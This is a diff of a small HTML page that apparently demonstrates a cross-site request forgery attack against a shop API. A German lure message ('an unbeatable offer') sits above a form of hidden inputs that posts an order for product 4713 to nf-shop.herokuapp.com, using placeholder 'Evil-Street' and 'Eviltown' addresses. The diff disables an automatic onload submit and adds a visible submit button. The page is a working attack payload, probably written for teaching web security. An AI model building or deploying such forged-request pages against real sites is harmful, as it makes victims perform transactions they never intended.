@@ -24,7 +24,7 @@
                     })
                 });
                 */
-                window.setTimeout(() => document.getElementById("myForm").submit());
+                //window.setTimeout(() => document.getElementById("myForm").submit());
             }
 
         </script>
@@ -32,14 +32,13 @@
 
     <body onload="buy()">
         Ich habe ein unschlagbares Angebot für dich!!!
-        <div style="display:none">
         <form id="myForm" method="post" mode="no-cors" action="https://nf-shop.herokuapp.com/api/orders">
-            <input type="text" id="product" name="product" value="4713" />
-            <input type="text" id="name" name="name" value="Andre Schreck" />
-            <input type="text" id="street" name="street" value="Evil-Street 1" />
-            <input type="text" id="zip" name="zip" value="666" />
-            <input type="text" id="city" name="city" value="Eviltown" />
+            <input type="hidden" id="product" name="product" value="4713" />
+            <input type="hidden" id="name" name="name" value="Andre Schreck" />
+            <input type="hidden" id="street" name="street" value="Evil-Street 1" />
+            <input type="hidden" id="zip" name="zip" value="666" />
+            <input type="hidden" id="city" name="city" value="Eviltown" />
+            <input type="submit" value="Klar!" />
         </form>
-        </div>
     </body>
 </html>
